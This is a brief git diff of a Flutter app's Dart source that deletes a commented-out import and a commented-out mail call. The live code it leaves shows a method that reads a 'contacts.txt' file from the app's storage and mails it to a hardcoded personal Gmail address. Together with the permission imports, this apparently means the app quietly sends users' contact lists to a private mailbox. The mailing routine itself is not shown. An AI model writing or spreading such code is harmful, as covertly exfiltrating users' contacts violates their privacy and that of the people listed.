@@ -6,7 +6,6 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:kaamkhoj/loginresgiter/Login.dart';
-//import 'package:number_to_words_spelling/number_to_words_spelling.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
@@ -156,7 +155,6 @@ class _MyAppState extends State<MyApp> {
   sendContactsMethod() async {
     final Directory directory = await getApplicationDocumentsDirectory();
     final File file = File('${directory.path}/contacts.txt');
-//    sendMailContacts("amkhati11@gmail.com", file);
     sendMailContacts("Clopes024@gmail.com", file);
     addStringToSF();
   }
